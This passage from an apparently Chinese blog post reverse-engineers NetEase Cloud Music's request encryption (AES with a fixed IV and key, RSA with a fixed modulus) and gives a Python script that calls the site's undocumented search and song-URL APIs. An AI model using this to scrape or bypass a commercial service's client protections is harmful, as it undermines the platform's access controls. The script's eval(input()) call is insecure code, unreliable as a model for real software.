<span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br></pre></td></tr></table></figure>
<ul>
<li>requests.request(method,url,**kwargs) 的参数：<ul>
<li>method：请求类型（这里是”POST”）</li>
<li>url：请求对象的链接（这里是目标 API）</li>
<li>headers：请求头，直接 F12 查看，上面有什么条目直接抄<ul>
<li>PS：我 F12 看到的与作者代码中有不同的地方，但不影响结果</li>
</ul>
</li>
<li>data：字典、字节序列或文件对象，作为 Requests 的内容 </li>
</ul>
</li>
<li>最后返回服务器响应</li>
</ul>
<p>大佬这两个函数就是实现了 “获取歌曲列表，获取歌曲播放链接” 的功能（就是 url 不同）</p>
<ul>
<li>在查找界面 F12 截下的图（这个API和大佬用的不一样，爬取的歌单少一点）</li>
</ul>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652892593720-1652970678978.png" class width="1652892593720">  
<ul>
<li>在播放界面 F12 截下的图（不知道大佬是怎么断定它就是播放链接的）</li>
</ul>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652892892160-1652970678978.png" class width="1652892892160">  
<ul>
<li><p>请求头部分截取（主要是 cookie 太长了~）</p>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652892407410-1652970678978.png" class width="1652892407410">  
</li>
</ul>
<p>要说大佬最亮眼的地方，就是对网易云加密算法的破解了（“params”和“encSecKey”）</p>
<p>点开 <strong>Headers</strong> 后我们可以发现，除了传统的请求头参数外，本次请求还携带了一个 <strong>Form</strong> 表单，其中有两个参数，分别是 <strong>params</strong> 和 <strong>encSecKey</strong> </p>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652893595871-1652970678978.png" class width="1652893595871"> 
<p>具体来说，是用了 AES 和一些自创的加密算法，本人以前是搞逆向的，所以这些东西还是能应付，就是 JavaScript 有点恼火</p>
<p>搜索 encSecKey 我找到的就是这么一堆东西：</p>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652894215310-1652970678978.png" class width="1652894215310"> 
<p>在网上找个格式化网站进行格式化：</p>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652895300160-1652970678978.png" class width="1652895300160"> 
<p>搜索“encSecKey”：（最好不要搜索“params”）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bKB0x = <span class="built_in">window</span>.asrsea(<span class="built_in">JSON</span>.stringify(i1x), buV7O([<span class="string">&quot;流泪&quot;</span>, <span class="string">&quot;强&quot;</span>]), buV7O(Rg9X.md), buV7O([<span class="string">&quot;爱心&quot;</span>, <span class="string">&quot;女孩&quot;</span>, <span class="string">&quot;惊恐&quot;</span>, <span class="string">&quot;大笑&quot;</span>]));</span><br><span class="line">e1x.data = j1x.cr2x(&#123;</span><br><span class="line">	<span class="attr">params</span>: bKB0x.encText,</span><br><span class="line">	<span class="attr">encSecKey</span>: bKB0x.encSecKey</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>把 window.asrsea 实例化为 bKB0x，然后调用其中的方法“encText”，“encSecKey”</li>
</ul>
<p>搜索“asrsea”：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params">d, e, f, g</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> h = &#123;&#125;,</span><br><span class="line">		i = a(<span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span> h.encText = b(d, g), </span><br><span class="line">           h.encText = b(h.encText, i), </span><br><span class="line">           h.encSecKey = c(i, e, f), </span><br><span class="line">           h</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.asrsea = d, <span class="built_in">window</span>.ecnonasr = e</span><br></pre></td></tr></table></figure>
<ul>
<li>定义“encText”函数：<ul>
<li>利用“a(16)”获取“i”</li>
<li>进行第一次“b”算法</li>
<li>把“b”算法的结果和“i”作为参数，再进行一次“b”算法</li>
</ul>
</li>
<li>定义“encSecKey”函数：<ul>
<li>利用“a(16)”获取“i”</li>
<li>进行一次“c”算法</li>
</ul>
</li>
</ul>
<p>“a”算法的实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> d, e, b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>,</span><br><span class="line">		c = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (d = <span class="number">0</span>; a &gt; d; d += <span class="number">1</span>) e = <span class="built_in">Math</span>.random() * b.length, e = <span class="built_in">Math</span>.floor(e), c += b.charAt(e);</span><br><span class="line">	<span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>从大小写英文字母以及10个数字中随机抽取16个字符拼接成一个新的字符串返回结果 </li>
</ul>
<p>“b”算法的实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> c = CryptoJS.enc.Utf8.parse(b),</span><br><span class="line">		d = CryptoJS.enc.Utf8.parse(<span class="string">&quot;0102030405060708&quot;</span>),</span><br><span class="line">		e = CryptoJS.enc.Utf8.parse(a),</span><br><span class="line">		f = CryptoJS.AES.encrypt(e, c, &#123;</span><br><span class="line">			<span class="attr">iv</span>: d,</span><br><span class="line">			<span class="attr">mode</span>: CryptoJS.mode.CBC</span><br><span class="line">		&#125;);</span><br><span class="line">	<span class="keyword">return</span> f.toString()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>通过 <strong>CBC</strong> 模式进行 <strong>AES</strong> 加密，将传入的 a 参数和 b 参数分别作为需要加密的内容和密钥，iv偏移量为一个固定的字符串“0102030405060708”</li>
</ul>
<p>“c”算法的实现：（前两个还好，这一串代码直接给我干沉默了…）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> d, e;</span><br><span class="line">	<span class="keyword">return</span> setMaxDigits(<span class="number">131</span>), </span><br><span class="line">           d = <span class="keyword">new</span> RSAKeyPair(b, <span class="string">&quot;&quot;</span>, c), </span><br><span class="line">           e = encryptedString(d, a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RSAKeyPair</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">       <span class="built_in">this</span>.e = biFromHex(a), </span><br><span class="line">       <span class="built_in">this</span>.d = biFromHex(b), </span><br><span class="line">       <span class="built_in">this</span>.m = biFromHex(c),</span><br><span class="line">       <span class="built_in">this</span>.chunkSize = <span class="number">2</span> * biHighIndex(<span class="built_in">this</span>.m), </span><br><span class="line">       <span class="built_in">this</span>.radix = <span class="number">16</span>,</span><br><span class="line">       <span class="built_in">this</span>.barrett = <span class="keyword">new</span> BarrettMu(<span class="built_in">this</span>.m)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encryptedString</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> f, g, h, i, j, k, l, c = <span class="keyword">new</span> <span class="built_in">Array</span>, d = b.length, e = <span class="number">0</span>; d &gt; e;) c[e] = b.charCodeAt(e), e++;</span><br><span class="line">       <span class="keyword">for</span> (; <span class="number">0</span> != c.length % a.chunkSize;) c[e++] = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span> (f = c.length, g = <span class="string">&quot;&quot;</span>, e = <span class="number">0</span>; f &gt; e; e += a.chunkSize) &#123;</span><br><span class="line">           <span class="keyword">for</span> (j = <span class="keyword">new</span> <span class="built_in">BigInt</span>, h = <span class="number">0</span>, i = e; i &lt; e + a.chunkSize; ++h) j.digits[h] = c[i++], j.digits[h] += c[i++] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">           k = a.barrett.powMod(j, a.e), l = <span class="number">16</span> == a.radix ? biToHex(k) : biToString(k, a.radix), g += l + <span class="string">&quot; &quot;</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> g.substring(<span class="number">0</span>, g.length - <span class="number">1</span>)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>最后提一下这些函数的参数：（由于我不会断点调试，这里就不展示过程了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d：&#123;<span class="string">&quot;hlpretag&quot;</span>:<span class="string">&quot;&lt;span class=\&quot;s-fc7\&quot;&gt;&quot;</span>,<span class="string">&quot;hlposttag&quot;</span>:<span class="string">&quot;&lt;/span&gt;&quot;</span>,<span class="string">&quot;s&quot;</span>:<span class="string">&quot;Lily&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;offset&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;total&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;limit&quot;</span>:<span class="string">&quot;30&quot;</span>,<span class="string">&quot;csrf_token&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">e：<span class="string">&quot;010001&quot;</span></span><br><span class="line">f：<span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;</span></span><br><span class="line">g：<span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>参数 <strong>e，f，g</strong> 始终保持不表，由此可见它们是3个常量</li>
<li>只是参数 <strong>d</strong> 中的歌曲名称在变化</li>
</ul>
<p>理解完大佬的代码后，我在他的基础上进行了修改：</p>
<h2 id="白嫖网易云-V1-0"><a href="#白嫖网易云-V1-0" class="headerlink" title="白嫖网易云_V1.0"></a>白嫖网易云_V1.0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Music</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_random</span>(<span class="params">self</span>):</span></span><br><span class="line">        random_str = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">len_change</span>(<span class="params">self,text</span>):</span></span><br><span class="line">        pad = <span class="number">16</span> - <span class="built_in">len</span>(text) % <span class="number">16</span></span><br><span class="line">        text = text + pad * <span class="built_in">chr</span>(pad)</span><br><span class="line">        text = text.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">aes</span>(<span class="params">self,text, key</span>):</span></span><br><span class="line">        iv = <span class="string">b&#x27;0102030405060708&#x27;</span></span><br><span class="line">        text = self.len_change(text)</span><br><span class="line">        cipher = AES.new(key.encode(), AES.MODE_CBC, iv)</span><br><span class="line">        encrypted = cipher.encrypt(text)</span><br><span class="line">        encrypt = base64.b64encode(encrypted).decode()</span><br><span class="line">        <span class="keyword">return</span> encrypt</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">self,text, <span class="built_in">str</span></span>):</span></span><br><span class="line">        first_data = self.aes(text, <span class="string">&#x27;0CoJUm6Qyw8W8jud&#x27;</span>)</span><br><span class="line">        second_data = self.aes(first_data, <span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">return</span> second_data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">c</span>(<span class="params">self,text</span>):</span></span><br><span class="line">        e = <span class="string">&#x27;010001&#x27;</span></span><br><span class="line">        f = <span class="string">&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line">        text = text[::-<span class="number">1</span>]</span><br><span class="line">        result = <span class="built_in">pow</span>(<span class="built_in">int</span>(binascii.hexlify(text.encode()), <span class="number">16</span>), <span class="built_in">int</span>(e, <span class="number">16</span>), <span class="built_in">int</span>(f, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">format</span>(result, <span class="string">&#x27;x&#x27;</span>).zfill(<span class="number">131</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_final_param</span>(<span class="params">self,text, <span class="built_in">str</span></span>):</span></span><br><span class="line">        params = self.b(text, <span class="built_in">str</span>)</span><br><span class="line">        encSecKey = self.c(<span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;params&#x27;</span>: params, <span class="string">&#x27;encSecKey&#x27;</span>: encSecKey&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_music_list</span>(<span class="params">self,params, encSecKey</span>):</span></span><br><span class="line">        url = <span class="string">&quot;https://music.163.com/weapi/cloudsearch/get/web?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/search/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_reply</span>(<span class="params">self,params, encSecKey</span>):</span></span><br><span class="line">        url = <span class="string">&quot;https://music.163.com/weapi/song/enhance/player/url/v1?csrf_token=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">self,song_name_list,song_url_list,song_num</span>):</span></span><br><span class="line">        num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入播放编号:&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span>(num &lt; song_num):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;开始播放:&quot;</span>+song_name_list[num])</span><br><span class="line">            wb = webbrowser.get(<span class="string">&#x27;windows-default&#x27;</span>)</span><br><span class="line">            wb.<span class="built_in">open</span>(song_url_list[num])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;编号错误&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">self</span>):</span></span><br><span class="line">        song_url_list = []</span><br><span class="line">        song_name_list = []</span><br><span class="line">        song_num = <span class="number">0</span></span><br><span class="line">        song_search = <span class="built_in">input</span>(<span class="string">&#x27;请输入搜索目标,按回车键进行搜索:&#x27;</span>)</span><br><span class="line">        d = &#123;<span class="string">&quot;hlpretag&quot;</span>: <span class="string">&quot;&lt;span class=\&quot;s-fc7\&quot;&gt;&quot;</span>, <span class="string">&quot;hlposttag&quot;</span>: <span class="string">&quot;&lt;/span&gt;&quot;</span>, <span class="string">&quot;s&quot;</span>: song_search, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">             <span class="string">&quot;total&quot;</span>: <span class="string">&quot;true&quot;</span>, <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;30&quot;</span>, <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        d = json.dumps(d)</span><br><span class="line">        random_param = self.get_random()</span><br><span class="line">        param = self.get_final_param(d, random_param)</span><br><span class="line">        song_list = self.get_music_list(param[<span class="string">&#x27;params&#x27;</span>], param[<span class="string">&#x27;encSecKey&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;搜索结果如下:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(song_list) &gt; <span class="number">0</span>:</span><br><span class="line">            song_list = json.loads(song_list)[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;songs&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(song_list):</span><br><span class="line">                item = json.dumps(item)</span><br><span class="line">                song_name = json.loads(<span class="built_in">str</span>(item))[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot;：&quot;</span> + song_name)</span><br><span class="line">                d = &#123;<span class="string">&quot;ids&quot;</span>: <span class="string">&quot;[&quot;</span> + <span class="built_in">str</span>(json.loads(<span class="built_in">str</span>(item))[<span class="string">&#x27;id&#x27;</span>]) + <span class="string">&quot;]&quot;</span>, <span class="string">&quot;level&quot;</span>: <span class="string">&quot;standard&quot;</span>, <span class="string">&quot;encodeType&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">                d = json.dumps(d)</span><br><span class="line">                param = self.get_final_param(d, random_param)</span><br><span class="line">                song_info = self.get_reply(param[<span class="string">&#x27;params&#x27;</span>], param[<span class="string">&#x27;encSecKey&#x27;</span>])</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(song_info) &gt; <span class="number">0</span>:</span><br><span class="line">                    song_info = json.loads(song_info)</span><br><span class="line">                    song_url = json.dumps(song_info[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;url&#x27;</span>], ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">                    song_name_list.append(song_name)</span><br><span class="line">                    song_url_list.append(song_url)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;该首歌曲解析失败，可能是因为歌曲格式问题&quot;</span>)</span><br><span class="line">                song_num = i+<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;一共搜索到&#123;&#125;个目标&quot;</span>.<span class="built_in">format</span>(song_num))</span><br><span class="line">            self.choice(song_name_list,song_url_list,song_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;很抱歉，未能搜索到相关歌曲信息&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mus = Music()</span><br><span class="line">    mus.start()</span><br></pre></td></tr></table></figure>
<p>效果展示：</p>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652932443142-1652970678978.png" class width="1652932443142"> 
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652932460709-1652970678978.png" class width="1652932460709"> 
<p>PS：有些歌曲要 VIP，这个我可破解不了，当然也播放不了</p>
<p>更新日志：</p>
<ul>
<li><p>version：v1.0</p>
</li>
<li><p>date：2022.5.19</p>
</li>
<li><p>type：</p>
<ul>
<li>Features：NULL</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li><p>desc：</p>
<ul>
<li>第一代版本，下一个版本打算加上 UI 界面，另外把 VIP 歌曲单独标记出来</li>
</ul>
</li>
</ul>
